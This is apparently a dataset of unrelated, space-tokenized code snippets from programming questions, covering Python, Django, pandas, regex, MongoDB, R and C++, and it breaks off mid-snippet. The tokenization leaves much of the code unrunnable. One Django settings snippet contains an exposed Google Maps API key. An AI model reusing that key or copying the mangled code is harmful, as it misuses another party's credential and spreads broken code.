\Users\mwx825326\PycharmProjects\MyReference\venv\Lib\site-packages\dash\dash.py '' , line 1337 , in add_context output_value = func ( *args , **kwargs ) # % % callback invoked % % TypeError : update_graph ( ) missing 1 required positional argument : 'date_value '"
"> > > round ( 0.45 , 1 ) 0.5 > > > round ( 1.45 , 1 ) 1.4 > > > round ( 2.45 , 1 ) 2.5 > > > round ( 3.45 , 1 ) 3.5 > > > round ( 4.45 , 1 ) 4.5 > > > round ( 5.45 , 1 ) 5.5 > > > round ( 6.45 , 1 ) 6.5 > > > round ( 7.45 , 1 ) 7.5 > > > round ( 8.45 , 1 ) 8.4 > > > round ( 9.45 , 1 ) 9.4 1.9.3p194 :009 > 0.upto ( 9 ) do |n|1.9.3p194 :010 > puts ( n+0.45 ) .round ( 1 ) 1.9.3p194 :011 ? > end0.51.52.53.54.55.56.57.58.59.5"
"x = sorted ( d.items ( ) , key=operator.itemgetter ( 0 ) ) y = sorted ( x , key=operator.itemgetter ( 1 ) )"
"File `` < ipython-input-2-bdbae5b82d3c > '' , line 1 , in < module > opt.myFuncOptimization ( ) File `` /home/joe/Desktop/optimization_folder/Python/Optimization.py '' , line 45 , in myFuncOptimization**f_values = pool.map_async ( partial_function_to_optmize , solutions ) .get ( ) **File `` /usr/lib/python3.5/multiprocessing/pool.py '' , line 608 , in getraise self._value File `` /usr/lib/python3.5/multiprocessing/pool.py '' , line 385 , in _handle_tasksput ( task ) File `` /usr/lib/python3.5/multiprocessing/connection.py '' , line 206 , in sendself._send_bytes ( ForkingPickler.dumps ( obj ) ) File `` /usr/lib/python3.5/multiprocessing/connection.py '' , line 393 , in _send_bytesheader = struct.pack ( `` ! i '' , n ) error : ' i ' format requires -2147483648 < = number < = 2147483647 import numpy as npimport cmaimport multiprocessing as mpimport functoolsimport myFuncsimport hdf5storagedef myFuncOptimization ( ) : temp = hdf5storage.loadmat ( '/home/joe/Desktop/optimization_folder/matlab_workspace_for_optimization ' ) input_A_Opt = temp [ `` input_A '' ] input_B_Opt = temp [ `` input_B '' ] del temp numCores = 20 # Inputs # ________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________ P0 = np.array ( [ 4.66666667 , 2.5 , 2.66666667 , 4.16666667 , 0.96969697 , 1.95959596 , 0.44088176 , 0.04040404 , 6.05210421 , 0.58585859 , 0.46464646 , 8.75751503 , 0.16161616 , 1.24248497 , 1.61616162 , 1.56312625 , 5.85858586 , 0.01400841 , 1.0 , 2.4137931 , 0.38076152 , 2.5 , 1.99679872 ] ) LBOpt = np.array ( [ 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , 0.0 , ] ) UBOpt = np.array ( [ 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , 10.0 , ] ) initialStdsOpt = np.array ( [ 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , 2.0 , ] ) minStdsOpt = np.array ( [ 0.030 , 0.40 , 0.030 , 0.40 , 0.020 , 0.020 , 0.020 , 0.020 , 0.020 , 0.020 , 0.020 , 0.020 , 0.020 , 0.020 , 0.020 , 0.020 , 0.020 , 0.020 , 0.050 , 0.050 , 0.020 , 0.40 , 0.020 , ] ) options = { 'bounds ' : [ LBOpt , UBOpt ] , 'CMA_stds ' : initialStdsOpt , 'minstd ' : minStdsOpt , 'popsize ' : numCores } es = cma.CMAEvolutionStrategy ( P0 , 1 , options ) pool = mp.Pool ( numCores ) partial_function_to_optmize = functools.partial ( myFuncs.func1 , input_A=input_A_Opt , input_B=input_B_Opt ) while not es.stop ( ) : solutions = es.ask ( es.popsize ) f_values = pool.map_async ( partial_function_to_optmize , solutions ) .get ( ) es.tell ( solutions , f_values ) es.disp ( 1 ) es.logger.add ( ) return es.result_pretty ( )"
"function [ a , b ] = toto ( c ) ; a = c ; b = c + 1 ; end > > [ x , y ] = toto ( 3 ) x = 3y = 4 from oct2py import octavemy_dir = `` D : \\My_Dir '' octave.addpath ( my_dir ) a , b = octave.toto ( 3 )"
"def reduce ( li ) : result= [ 0 for i in xrange ( ( len ( li ) /2 ) + ( len ( li ) % 2 ) ) ] for i , e in enumerate ( li ) : result [ int ( i/2 ) ] += e for i in range ( len ( result ) ) : result [ i ] /= 2 if ( len ( li ) % 2 == 1 ) : result [ len ( result ) -1 ] *= 2 return result a = [ 0,2,10,12 ] b = [ 0,2,10,12,20 ] reduce ( a ) > > > [ 1,11 ] reduce ( b ) > > > [ 1,11,20 ]"
"classA.py # table definition and class A definitionclassB.py # table definition and class B definition # # # model.pyimport classA , classBmap ( classA.classA , clasSA.table ) map ( classB.classB , clasSB.table )"
"Uncaught ReferenceError : DjangoGooglePointFieldWidget is not defined INSTALLED_APPS = [ ... 'mapwidgets ' , ] MAP_WIDGETS = { `` GoogleStaticMapWidget '' : ( ( `` zoom '' , 15 ) , ( `` size '' , `` 320x320 '' ) , ) , `` GoogleStaticMapMarkerSettings '' : ( ( `` color '' , `` green '' ) , ) , `` GOOGLE_MAP_API_KEY '' : `` AIzaSyA1fXsJSKqZH_Bl9d9wueJMlpXd-6tEJy0 '' } class CompanySettingEdit ( forms.ModelForm ) : display_companyname = forms.CharField ( label='Display Company Name ' , max_length=50 , required=True ) class Meta : model = Company fields = ( `` display_companyname '' , '' location_point '' ) widgets = { 'location_point ' : GooglePointFieldWidget , } STATIC_URL = '/static/'STATICFILES_DIRS = ( os.path.join ( BASE_DIR , `` ../projectapp/static '' ) , ) PROJECT_DIR = os.path.dirname ( os.path.abspath ( __file__ ) ) STATIC_ROOT = os.path.join ( PROJECT_DIR , '../../../static_root ' )"
"Column-1row-1 0row-2 25.00row-3 27.14row-4 29.29row-5 31.43row-6 33.57 Column-1 Column-2row-1 0 0row-2 25.00 25.00row-3 27.14 2.14row-4 29.29 2.15row-5 31.50 2.21row-6 33.57 2.07 import syswith open ( 'file.txt ' , `` r '' ) as f : sys.stdout = open ( ' % s ( calc ) .txt ' % f.name , ' a ' ) for line in f : column = line.strip ( ) .split ( ) Column_1 = float ( column [ 0 ] ) column.extend ( [ None ] )"
ABC is a word from one line of this document . It is followed bysome random linePQR which happens to be another word.This is just another lineI have to fix my regular expression.Here GHI appears in the middle.This may be yet another line.VWX is a linethis is the last line PQR which happens to be another word.This is just another lineI have to fix my regular expression.VWX is a linethis is the last line ^ . *\b ( abc|def|ghi ) \b ( .|\s ) * ? \b ( pqr|stu|vwx ) \b ^ . *\\b ( patient demographics|electronically signed|md|rn|mspt|crnp|rt ) \\b ( .|\\s ) * ? \\b ( history of present illness|hpi|chief complaint|cc|reason for consult|patientis|inpatient is|inpatientpatient|pt is|pts are|start end frequency user ) \\b Exception in thread `` main '' java.lang.StackOverflowError at java.util.regex.Pattern $ GroupTail.match ( Pattern.java:4218 ) at java.util.regex.Pattern $ BranchConn.match ( Pattern.java:4078 ) at java.util.regex.Pattern $ CharProperty.match ( Pattern.java:3345 ) at java.util.regex.Pattern $ Branch.match ( Pattern.java:4114 ) at java.util.regex.Pattern $ GroupHead.match ( Pattern.java:4168 ) at java.util.regex.Pattern $ LazyLoop.match ( Pattern.java:4357 ) at java.util.regex.Pattern $ GroupTail.match ( Pattern.java:4227 ) at java.util.regex.Pattern $ BranchConn.match ( Pattern.java:4078 )
"OperationFailure : Executor error during find command : OperationFailed : Sort operation used more than the maximum 33554432 bytes of RAM . Add an index , or specify a smaller limit . `` queryPlanner '' : { `` plannerVersion '' : 1 , `` namespace '' : `` bla.my_collection '' , `` indexFilterSet '' : false , `` parsedQuery '' : { `` foo '' : { `` $ eq '' : false } } , `` winningPlan '' : { `` stage '' : `` LIMIT '' , `` limitAmount '' : 100 , `` inputStage '' : { `` stage '' : `` SKIP '' , `` skipAmount '' : 9000 , `` inputStage '' : { `` stage '' : `` FETCH '' , `` inputStage '' : { `` stage '' : `` IXSCAN '' , `` keyPattern '' : { `` foo '' : 1 , `` meta_data.created_at '' : -1 } , `` indexName '' : `` foo_1_meta_data.created_at_-1 '' , `` isMultiKey '' : false , `` multiKeyPaths '' : { `` foo '' : [ ] , `` meta_data.created_at '' : [ ] } , `` isUnique '' : false , `` isSparse '' : false , `` isPartial '' : false , `` indexVersion '' : 1 , `` direction '' : `` forward '' , `` indexBounds '' : { `` foo '' : [ `` [ false , false ] '' ] , `` meta_data.created_at '' : [ `` [ MaxKey , MinKey ] '' ] } } } } } , `` rejectedPlans '' : [ { `` stage '' : `` SKIP '' , `` skipAmount '' : 19000 , `` inputStage '' : { `` stage '' : `` SORT '' , `` sortPattern '' : { `` meta_data.created_at '' : -1 } , `` limitAmount '' : 19100 , `` inputStage '' : { `` stage '' : `` SORT_KEY_GENERATOR '' , `` inputStage '' : { `` stage '' : `` FETCH '' , `` inputStage '' : { `` stage '' : `` IXSCAN '' , `` keyPattern '' : { `` foo '' : 1 , `` _id '' : 1 } , `` indexName '' : `` foo_1__id_1 '' , `` isMultiKey '' : false , `` isUnique '' : false , `` isSparse '' : false , `` isPartial '' : false , `` indexVersion '' : 1 , `` direction '' : `` forward '' , `` indexBounds '' : { `` foo '' : [ `` [ false , false ] '' ] , `` _id '' : [ `` [ MinKey , MaxKey ] '' ] } } } } } }"
"import numpy as npfrom matplotlib import pyplot as pltimg = cv2.imread ( 'ISIC_0000000_segmentation.png',0 ) edges = cv2.Canny ( img,0,255 ) plt.subplot ( 121 ) , plt.imshow ( img , cmap='gray ' ) plt.title ( 'Original Image ' ) , plt.xticks ( [ ] ) , plt.yticks ( [ ] ) plt.subplot ( 122 ) , plt.imshow ( edges , cmap='gray ' ) plt.title ( 'Edge Image ' ) , plt.xticks ( [ ] ) , plt.yticks ( [ ] ) plt.show # Importing Image and ImageChops module from PIL package from PIL import Image , ImageChops # creating a image1 object im1 = Image.open ( `` ISIC_0000000.jpg '' ) # creating a image2 object im2 = Image.open ( `` ISIC_0000000_segmentation.png '' ) # applying multiply method im3 = ImageChops.multiply ( im1 , im2 ) im3.show ( )"
"DICE COUNT : 4FACE COUNT : 12D1 : 1,8,11,14,19,22,27,30,35,38,41,48D2 : 2,7,10,15,18,23,26,31,34,39,42,47D3 : 3,6,12,13,17,24,25,32,36,37,43,46D4 : 4,5 , 9,16,20,21,28,29,33,40,44,45 > > > generate_dice ( players=4 ) [ [ 1,8,11,14,19,22,27,30,35,38,41,48 ] , [ 2,7,10,15,18,23,26,31,34,39,42,47 ] , [ 3,6,12,13,17,24,25,32,36,37,43,46 ] , [ 4,5,9,16,20,21,28,29,33,40,44,45 ] ]"
"class A ( object ) : def save ( self ) : print `` A '' class B ( A ) : def save ( self ) : print `` B '' super ( B , self ) .save ( ) class C ( A ) : def save ( self ) : print `` C '' super ( C , self ) .save ( ) class D ( C , B ) : def save ( self ) : print `` D '' super ( D , self ) .save ( ) D ( ) .save ( ) DCBA class A ( object ) : def save ( self ) : print `` A '' class B ( A ) : def save ( self ) : print `` B '' super ( B , self ) .save ( ) class C ( A ) : def save ( self ) : print `` C '' # removed super call hereclass D ( C , B ) : def save ( self ) : print `` D '' super ( D , self ) .save ( ) D ( ) .save ( ) DC class A ( object ) : def save ( self ) : print `` A '' class B ( object ) : # inherits object now instead of A def save ( self ) : print `` B '' super ( B , self ) .save ( ) class C ( A ) : def save ( self ) : print `` C '' super ( C , self ) .save ( ) class D ( C , B ) : def save ( self ) : print `` D '' super ( D , self ) .save ( ) D ( ) .save ( ) DCA"
"class CustomerVisit ( models.Model ) : start_date = models.DateField ( ) end_date = models.DateField ( ) customer = models.ForeignKey ( Customer ) address = models.ForeignKey ( Address ) address = forms.ModelChoiceField ( label='Address ' , queryset=Address.objects.none ( ) , widget=forms.Select ( attrs= { 'style ' : 'width : 100 % ; ' } ) ) customer = forms.ModelChoiceField ( label='Customer ' , queryset=Customer.objects.all ( ) , widget=forms.Select ( attrs= { 'style ' : 'width : 100 % ; ' } ) ) if request.method == `` POST '' : # Cleaning fields post = request.POST.copy ( ) post [ 'address ' ] = Address.objects.get ( id=post [ 'address ' ] ) post [ 'start_date ' ] = dateparser.parse ( post [ 'start_date ' ] ) post [ 'end_date ' ] = dateparser.parse ( post [ 'end_date ' ] ) # Updating request.POST request.POST = post form = CustomerVisitForm ( request.POST ) if form.is_valid ( ) : form.save ( commit=True ) return redirect ( `` customervisit : calendar '' ) $ ( `` # id_customer '' ) .select2 ( { } ) .on ( `` change '' , function ( ) { var customer_id = $ ( `` # id_customer '' ) .val ( ) ; var id_address = $ ( `` # id_address '' ) ; id_address.select2 ( { ajax : { url : '/get_customer_address/ ' + customer_id , dataType : `` json '' , type : `` GET '' , data : function ( params ) { var queryParameters = { term : params.term } return queryParameters ; } , processResults : function ( data ) { return { results : $ .map ( data , function ( item ) { return { text : item.text , id : item.id } } ) } ; } } } ) ; } ) ;"
lista = sequenceslista.pop ( 0 ) print ( lista ) for x in range ( sequences ) : mc =sequences [ x ] +lista [ x ]
"pipenv run python3 script.py Traceback ( most recent call last ) : File `` /usr/local/bin/pipenv '' , line 7 , in < module > from pipenv import cliFile `` /usr/local/lib/python2.7/dist-packages/pipenv/__init__.py '' , line 17 , in < module > from .cli import cliFile `` /usr/local/lib/python2.7/dist-packages/pipenv/cli.py '' , line 89 , in < module > if ( ( now.tm_mon == 10 ) and ( now.tm_day == 30 ) ) or ( ( now.tm_mon == 10 ) and ( now.tm_day == 31 ) ) : AttributeError : 'time.struct_time ' object has no attribute 'tm_day'Traceback ( most recent call last ) : File `` /usr/local/bin/pipenv '' , line 7 , in < module > from pipenv import cliFile `` /usr/local/lib/python2.7/dist-packages/pipenv/__init__.py '' , line 17 , in < module >"
Knownvalue A B C D E F G H 17.3413 0 0 0 0 0 0 0 0 33.4534 0 0 0 0 0 0 0 0 Knownvalue A B C D E F G H 17.3413 0 1 0 0 0 0 0 0 33.4534 0 0 0 1 0 0 0 0
"import pandas as pddf1 = pd.DataFrame ( [ { ' a ' : 1 , ' b ' : 2 , ' c ' : 'foo ' } , { ' a ' : 3 , ' b ' : 4 , ' c ' : 'baz ' } , ] ) df2 = pd.DataFrame ( [ { ' a ' : 1 , ' b ' : 8 , ' c ' : 'bar ' } , ] ) print 'dtypes before update : \n % s\n % s ' % ( df1.dtypes , df2.dtypes ) df1.update ( df2 ) print '\ndtypes after update : \n % s\n % s ' % ( df1.dtypes , df2.dtypes ) dtypes before update : a int64b int64c objectdtype : objecta int64b int64c objectdtype : objectdtypes after update : a float64b float64c objectdtype : objecta int64b int64c objectdtype : object"
"HELLO_WORLD = ( `` Hello world '' , ) print HELLO_WORLD > ( 'Hello world ' , ) print HELLO_WORLD [ 0 ] > Hello world HELLO_WORLD [ 0 ] = `` Goodbye world '' Traceback ( most recent call last ) : File `` < pyshell # 3 > '' , line 1 , in < module > HELLO_WORLD [ 0 ] = `` Goodbye world '' TypeError : 'str ' object does not support item assignment HELLO_WORLD = `` Goodbye world '' print HELLO_WORLD > Goodbye world"
"def anyFunc ( name , age , sex = 'M ' , *cap_letters ) : print `` name `` , name print `` age `` , age print `` sex `` , sex for s in cap_letters : print `` capital letter : `` , s anyFunc ( `` Mona '' , 45 , ' F ' , * ( ' H ' , ' K ' , ' L ' ) ) name Monaage 45sex Fcapital letter : Hcapital letter : Kcapital letter : L anyFunc ( `` John '' , 45 , * ( ' H ' , ' K ' , ' L ' ) ) name Johnage 45sex Hcapital letter : Kcapital letter : L"
s = ' 1 ' * your_number
"item = ( 'item name ' , cost , profit , is_blue ) vase = [ 'Ming Vase ' , 1000 , 10000 , 0 ] plate = [ 'China Plate ' , 10 , 5 , 1 ] items = [ item1 , item2 , ... , itemN ] . profits = [ x [ 2 ] for x in items ] costs = [ x [ 1 ] for x in items ] from ortools.linear_solver import pywraplpsolver = pywraplp.Solver ( 'SolveAssignmentProblemMIP ' , pywraplp.Solver.CBC_MIXED_INTEGER_PROGRAMMING ) x = { } for i in range ( MAX_ITEMS ) : x [ i ] = solver.BoolVar ( ' x [ % s ] ' % ( i ) ) # Define the constraints total_chosen = 20solver.Add ( solver.Sum ( [ x [ i ] for i in range ( MAX_ITEMS ) ] ) == total_chosen ) max_cost = 5.0for i in range ( num_recipes ) : solver.Add ( x [ i ] * cost [ i ] < = max_cost ) solver.Maximize ( solver.Sum ( [ profits [ i ] * x [ i ] for i in range ( total_chosen ) ] ) ) sol = solver.Solve ( ) for i in range ( MAX_ITEMS ) : if x [ i ] .solution_value ( ) > 0 : print ( item [ i ] .item_name )"
"import oscwd = os.getcwd ( ) file = `` 003de5664668f009cbaa7944fe188ee1_recursion1.c_2016-04-21-21-06-11_9bacb48fecd32b8cb99238721e7e27a3 . `` change = `` student_1_recursion1.c_2016-04-21-21-06-11_9bacb48fecd32b8cb99238721e7e27a3 . `` oldname = os.path.join ( cwd , file ) newname = os.path.join ( cwd , change ) print ( file in os.listdir ( ) ) print ( os.path.isfile ( file ) ) os.rename ( oldname , newname ) TrueFalseTraceback ( most recent call last ) : File `` C : \Users\X\Desktop\code\sub\test.py '' , line 13 , in < module > os.rename ( oldname , newname ) FileNotFoundError : [ WinError 2 ] Das System kann die angegebene Datei nicht finden : ' C : \\Users\\X\\Desktop\\code\\sub\\003de5664668f009cbaa7944fe188ee1_recursion1.c_2016-04-21-21-06-11_9bacb48fecd32b8cb99238721e7e27a3 . ' - > ' C : \\Users\\X\\Desktop\\code\\sub\\student_1_recursion1.c_2016-04-21-21-06-11_9bacb48fecd32b8cb99238721e7e27a3 . ' [ Finished in 0.4s with exit code 1 ]"
"import pandas as pdimport blaze as bzdef f1 ( ) : counter = 0 groups = pd.DataFrame ( columns= [ 'name ' ] ) t = bz.TableSymbol ( 't ' , ' { name : string } ' ) e = bz.distinct ( t ) for chunk in store.select ( 'my_names ' , columns= [ 'name ' ] , chunksize=1e5 ) : counter += 1 print ( 'processing chunk % d ' % counter ) groups = pd.concat ( [ groups , chunk ] ) groups = bz.compute ( e , groups ) In [ 1 ] : from blaze import Data , computeIn [ 2 ] : d = Data ( 'test.bcolz ' ) In [ 3 ] : d.head ( 5 ) Out [ 3 ] : < repr ( < blaze.expr.collections.Head at 0x7b5e300 > ) failed : NotImplementedError : Do n't know how to compute : expr : _1.head ( 5 ) .head ( 11 ) data : { _1 : ctable ( ( 8769257 , ) , [ ( 'index ' , ' < i8 ' ) , ( 'date ' , 'S10 ' ) , ( 'accessDate ' , 'S26 ' ) ] ) nbytes : 367.97 MB ; cbytes : 35.65 MB ; ratio : 10.32 cparams : = cparams ( clevel=5 , shuffle=True , cname='blosclz ' ) rootdir : = 'test.bcolz ' [ ( 0L , '2014-12-12 ' , '2014-12-14T17:39:19.716000 ' ) ( 1L , '2014-12-11 ' , '2014-12-14T17:39:19.716000 ' ) ( 2L , '2014-12-10 ' , '2014-12-14T17:39:19.716000 ' ) ... , ( 1767L , '2009-11-11 ' , '2014-12-15T13:32:39.906000 ' ) ( 1768L , '2009-11-10 ' , '2014-12-15T13:32:39.906000 ' ) ( 1769L , '2009-11-09 ' , '2014-12-15T13:32:39.906000 ' ) ] } > C : \Anaconda > conda list blaze # packages in environment at C : \Anaconda : # blaze 0.6.8 np19py27_69 In [ 5 ] : import blazeIn [ 6 ] : blaze.__version__Out [ 6 ] : ' 0.6.7 ' In [ 6 ] : d = Data ( [ 1,2,2,2,3,4,4,4,5,6 ] ) In [ 7 ] : d.head ( 5 ) Out [ 7 ] : _20 11 22 23 24 3In [ 16 ] : list ( compute ( d._2.distinct ( ) ) ) Out [ 16 ] : [ 1 , 2 , 3 , 4 , 5 , 6 ]"
"someDynamicStr = `` bar '' # could come from various sources # worksu '' foo '' + someDynamicStru '' foo { } '' .format ( someDynamicStr ) someDynamicStr = `` \xff '' # uh-oh # raises UnicodeDecodeErroru '' foo '' + someDynamicStru '' foo { } '' .format ( someDynamicStr ) import codecscodecs.register_error ( `` strict '' , codecs.ignore_errors ) codecs.register_error ( `` strict '' , lambda x : ( u '' '' , x.end ) ) # alternatively class PatchedUnicode ( unicode ) : def __init__ ( self , obj=None , encoding=None , *args , **kwargs ) : if encoding in ( None , `` ascii '' , `` 646 '' , `` us-ascii '' ) : print ( `` Problematic unicode ( ) usage detected ! '' ) super ( PatchedUnicode , self ) .__init__ ( obj , encoding , *args , **kwargs ) import __builtin____builtin__.unicode = PatchedUnicode"
"class Interpolator ( object ) : `` '' '' Handles interpolation '' '' '' def __init__ ( self ) : self.ship_prev = None self.ship = None self.stars_prev = [ ] self.stars = [ ] self.bullets_prev = { } self.bullets = { } self.alpha = 0.5 def add_ship ( self , ship ) : self.ship_prev = self.ship self.ship = ship def add_stars ( self , stars ) : self.stars_prev = self.stars self.stars = stars [ : ] def add_bullets ( self , bullets ) : self.bullets_prev = self.bullets self.bullets = bullets.copy ( ) def add_enemies ( self , enemies ) : self.enemies_prev = self.enemies self.enemies = enemies # to be continued def lerp_ship ( self ) : if self.ship_prev is None : return self.ship return lerp_xy ( self.ship_prev , self.ship , self.alpha ) def lerp_stars ( self ) : if len ( self.stars_prev ) == 0 : return self.stars return ( lerp_xy ( s1 , s2 , self.alpha ) for s1 , s2 in izip ( self.stars_prev , self.stars ) ) def lerp_bullets ( self ) : keys = list ( set ( self.bullets_prev.keys ( ) + self.bullets.keys ( ) ) ) for k in keys : # interpolate as usual if k in self.bullets_prev and k in self.bullets : yield lerp_xy ( self.bullets_prev [ k ] , self.bullets [ k ] , self.alpha ) # bullet is dead elif k in self.bullets_prev : pass # bullet just added elif k in self.bullets : yield self.bullets [ k ] def lerp_xy ( o1 , o2 , alpha , threshold=100 ) : `` '' '' Expects namedtuples with x and y parameters . '' '' '' if sqrt ( ( o1.x - o2.x ) ** 2 + ( o1.y - o2.y ) ** 2 ) > 100 : return o2 return o1._replace ( x=lerp ( o1.x , o2.x , alpha ) , y=lerp ( o1.y , o2.y , alpha ) ) Ship = namedtuple ( 'Ship ' , ' x , y ' ) Star = namedtuple ( 'Star ' , ' x , y , r ' ) Bullet = namedtuple ( 'Bullet ' , ' x , y ' ) lerper = Interpolator ( ) # game loopwhile ( 1 ) : # physics # physics done lerper.add ( ship ) lerper.add ( stars ) lerper.add ( bullets ) lerper.add ( enemies ) # you got the idea # rendering draw_ship ( lerper.lerp ( 'Ship ' ) ) # or draw_ship ( lerper.lerp_ship ( ) )"
"library ( tidyverse ) library ( officer ) library ( rvg ) # Get some data and make a plotggp < - diamonds % > % group_by ( clarity ) % > % summarise ( price = mean ( price ) ) % > % ggplot ( aes ( x = clarity , y = price , fill = clarity ) ) + geom_bar ( stat = 'identity ' , colour = 'black ' ) # Create a new powerpoint documentdoc < - read_pptx ( ) doc < - add_slide ( doc , 'Title and Content ' , 'Office Theme ' ) # Add the plot doc < - ph_with_vg ( doc , ggobj = ggp , type = 'body ' ) # Write the document to a fileprint ( doc , target = 'plots.pptx ' )"
"{ 20 : [ 4.6 , 4.3 , 4.3 , 20 ] ,21 : [ 4.6 , 4.3 , 4.3 , 21 ] , 22 : [ 6.0 , 5.6 , 9.0 , 22 ] , 23 : [ 8.75 , 5.6 , 6.6 , 23 ] } items_dic = data [ [ `` Length '' , '' Width '' , '' Height '' , '' Pid '' ] ] .set_index ( 'Pid ' ) .T.to_dict ( 'list ' ) items_dic = { 20 : [ 4.6 , 4.3 , 4.3 ] , 21 : [ 4.6 , 4.3 , 4.3 ] , 22 : [ 6.0 , 5.6 , 9.0 ] , 23 : [ 8.75 , 5.6 , 6.6 ] }"
"sel = select ( [ UpdateTable.column ] ) .\ where ( UpdateTable.id == OrigTable.id ) up = update ( OrigTable ) .values ( column=sel ) UPDATE origtable SET column= ( SELECT updatetable.columnFROM updatetableWHERE updatetable.id = origtable.id ) UPDATE origtable SET column1 = updatetable.column1 , column2 = updatetable.column2 FROM updatetable WHERE origtable.id == updatetable.id"
"def grayscale ( x , min , max ) : return np.uint32 ( ( x-min ) / ( max-min ) *0xffffff )"
"> > > unique = np.unique ( np.random.choice ( 100 , 4 , replace=False ) ) > > > A = np.random.choice ( unique , 100 ) > > > table = np.zeros ( unique.max ( ) +1 , unique.dtype ) > > > table [ unique ] = np.arange ( unique.size ) > > > table [ A ] array ( [ 2 , 2 , 3 , 3 , 3 , 3 , 1 , 1 , 1 , 0 , 2 , 0 , 1 , 0 , 2 , 1 , 0 , 0 , 2 , 3 , 0 , 0 , 0 , 0 , 3 , 3 , 2 , 1 , 0 , 0 , 0 , 2 , 1 , 0 , 3 , 0 , 1 , 3 , 0 , 1 , 2 , 3 , 3 , 3 , 3 , 1 , 3 , 0 , 1 , 2 , 0 , 0 , 2 , 3 , 1 , 0 , 3 , 2 , 3 , 3 , 3 , 1 , 1 , 2 , 0 , 0 , 2 , 0 , 2 , 3 , 1 , 1 , 3 , 3 , 2 , 1 , 2 , 0 , 2 , 1 , 0 , 1 , 2 , 0 , 2 , 0 , 1 , 3 , 0 , 2 , 0 , 1 , 3 , 2 , 2 , 1 , 3 , 0 , 3 , 3 ] , dtype=int32 ) B = np.zeros_like ( A ) for i in range ( A.size ) : B [ i ] = unique.index ( A [ i ] )"
r '' path\path.exe ''
val = `` which is pythonic ? `` print ( `` '' .join ( reversed ( val ) ) ) print ( val [ : :-1 ] )
"from pyparsing import *teststring = `` a2 b5 c9 d e z '' expected_letter = Word ( `` ABCDEFGabcdefgzZxy '' , exact=1 ) expected_number = Word ( nums ) letter_and_number = expected_letter + expected_numberbare_letter = expected_letterbare_letter.setParseAction ( lambda s , l , t : t.append ( `` 1 '' ) ) elements = letter_and_number | bare_letterline = OneOrMore ( elements ) print line.parseString ( teststring )"
"> > > from PIL import Image > > > import numpy as np > > > img = Image.open ( `` ./tifs/18015.pdf_001.tif '' ) > > > arr = np.asarray ( img ) > > > np.shape ( arr ) ( 5847 , 4133 ) > > > arr.dtypedtype ( 'bool ' ) # all of the following four cases where I incrementally increase # the number of rows to 700 are done instantly > > > v = arr [ 1:100,1:100 ] .sum ( axis=0 ) > > > v = arr [ 1:500,1:100 ] .sum ( axis=0 ) > > > v = arr [ 1:600,1:100 ] .sum ( axis=0 ) > > > v = arr [ 1:700,1:100 ] .sum ( axis=0 ) # but suddenly this line makes Python crash > > > v = arr [ 1:800,1:100 ] .sum ( axis=0 ) fish : Job 1 , “ python3 ” terminated by signal SIGSEGV ( Address boundary error ) > > > arr = np.empty ( ( h , w ) , dtype=bool ) > > > arr.setflags ( write=True ) > > > for r in range ( h ) : > > > for c in range ( w ) : > > > arr.itemset ( ( r , c ) , img.getpixel ( ( c , r ) ) ) > > > v=arr.sum ( axis=0 ) > > > v.mean ( ) 5726.8618436970719 > > > arr.shape ( 5847 , 4133 )"
"shell_exec ( `` python /Applications/MAMP/htdocs/pharm/Webmaps.py '' ) Traceback ( most recent call last ) : File `` /Applications/MAMP/htdocs/pharm/Webmaps.py '' , line 1 , in import folium ImportError : No module named folium"
import numpy as np arr = np.random.rand ( 10 ) - 0.5 for num in arr : print ( f '' { num:0.4f } '' ) 0.0647-0.2608-0.27240.26420.04290.1461-0.3285-0.3914 for num in a : str_ = f '' { num:0.4f } '' print ( f '' { str_ : > 10 } '' )
class Sample ( object ) : _target_dir : Path @ property def target_dir ( self ) : pass class Sample ( object ) : target_dir : Path
"src/ foo/__init__.py < - contains the public stuff foo/_bar/bar.c < - the C extensiondoc/ < - Sphinx configuration conf.py ... setup ( cmdclass = { 'fake ' : fake , 'build_ext_fake ' : build_ext_fake } , package_dir = { `` : 'src ' } , packages = [ 'foo ' ] , name = 'foo ' , version = ' 0.1 ' , description = desc , ext_modules = [ module_real ] )"
"from django.db import models as aggregatorfield = 'person'reducer = getattr ( aggregator , 'Sum ' ) query_set.aggregate ( field=reducer ( field ) ) { 'person':12 } { 'field':12 }"
"import subprocessimport structimport sysimport numpy as np # set up the variables needed bytesPerDouble = 8sizeX = 2000sizeY = 2000offset = sizeX*sizeYtotalBytesPerArray = sizeX*sizeY*bytesPerDoubletotalBytes = totalBytesPerArray*2 # the 2 is because we pass 2 different versions of the 2D array # setup the testing data array a = np.zeros ( sizeX*sizeY*2 , dtype='d ' ) for i in range ( sizeX ) : for j in range ( sizeY ) : a [ j+i*sizeY ] = i a [ j+i*sizeY+offset ] = i if i % 10 == 0 : a [ j+i*sizeY+offset ] = jdata = a.tobytes ( ' C ' ) strTotalBytes = str ( totalBytes ) strLineBytes = str ( sizeY*bytesPerDouble ) # communicate with c++ codeprint ( `` starting C++ code '' ) command = `` C : \Python27\PythonPipes.exe '' proc = subprocess.Popen ( [ command , strTotalBytes , strLineBytes , str ( sizeY ) , str ( sizeX ) ] , stdin=subprocess.PIPE , stderr=subprocess.PIPE , stdout=subprocess.PIPE ) ByteBuffer = ( data ) proc.stdin.write ( ByteBuffer ) print ( `` Reading results back from C++ '' ) for i in range ( sizeX ) : returnvalues = proc.stdout.read ( sizeY*bytesPerDouble ) a = buffer ( returnvalues ) b = struct.unpack_from ( str ( sizeY ) + 'd ' , a ) print str ( b ) + `` `` + str ( i ) print ( 'done ' ) int main ( int argc , char **argv ) { int count = 0 ; long totalbytes = stoi ( argv [ argc-4 ] , nullptr,10 ) ; //bytes being transfered long bytechunk = stoi ( argv [ argc - 3 ] , nullptr , 10 ) ; //bytes being transfered at a time long height = stoi ( argv [ argc-2 ] , nullptr , 10 ) ; //bytes being transfered at a time long width = 